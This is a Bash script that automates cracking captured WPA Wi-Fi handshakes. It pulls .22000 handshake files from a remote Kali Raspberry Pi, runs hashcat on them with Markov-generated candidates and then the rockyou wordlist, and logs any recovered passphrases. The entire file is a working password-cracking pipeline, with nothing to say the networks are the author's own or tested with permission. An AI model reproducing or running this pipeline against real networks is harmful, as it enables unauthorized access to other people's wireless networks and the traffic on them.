#!/bin/bash
# home-pie auto-cracker: PULL new handshakes from kali-pie's library, crack them with
# markovgen (smart, ordered candidates) then a rockyou fallback. CPU-only (this is a Pi), so
# candidate QUALITY matters most - markovgen goes first. First hit per handshake wins; misses
# are marked 'tried' so we don't loop forever. Pull model = works even after home-pie was off.
set -u
KALI="kali-pie@pie-kali"                 # needs a home-pie SSH key authorized on kali-pie
LIBRARY_REMOTE="/opt/wpacrack/library/"
BASE="/opt/crackstack"
IN="$BASE/incoming"; DONE="$BASE/cracked"; TRIED="$BASE/tried"; LOG="$BASE/crackstack.log"
MDL="$BASE/model/combined_o3.mdl"; MG="$BASE/markovgen.py"; RY="/usr/share/wordlists/rockyou.txt"
mkdir -p "$IN" "$DONE" "$TRIED" "$BASE/model"
exec >>"$LOG" 2>&1
echo "=== crackstack run $(date) ==="
rsync -az --timeout=40 "$KALI:$LIBRARY_REMOTE" "$IN/" || { echo "rsync failed (kali-pie unreachable?)"; exit 0; }
find "$IN" -name '*.22000' 2>/dev/null | while read -r hash; do
  key="$(basename "$(dirname "$hash")")_$(basename "$hash")"
  [ -f "$TRIED/$key" ] && continue
  echo "--- cracking $hash @ $(date +%H:%M:%S)"
  : > "$TRIED/$key"                       # mark attempted
  OUT="$DONE/$key.txt"
  if [ -f "$MDL" ]; then
    nice -n 10 python3 "$MG" --model "$MDL" --count 20000000 --minlen 8 --maxlen 16 \
      | hashcat -m 22000 -a 0 "$hash" -o "$OUT" --outfile-format 2 --quiet --potfile-disable
  fi
  [ -s "$OUT" ] || hashcat -m 22000 -a 0 "$hash" "$RY" -o "$OUT" --outfile-format 2 --quiet --potfile-disable
  if [ -s "$OUT" ]; then echo "*** CRACKED $hash -> $(cat "$OUT")"; else echo "not cracked this pass: $hash"; rm -f "$OUT"; fi
done
echo "=== crackstack done $(date) ==="
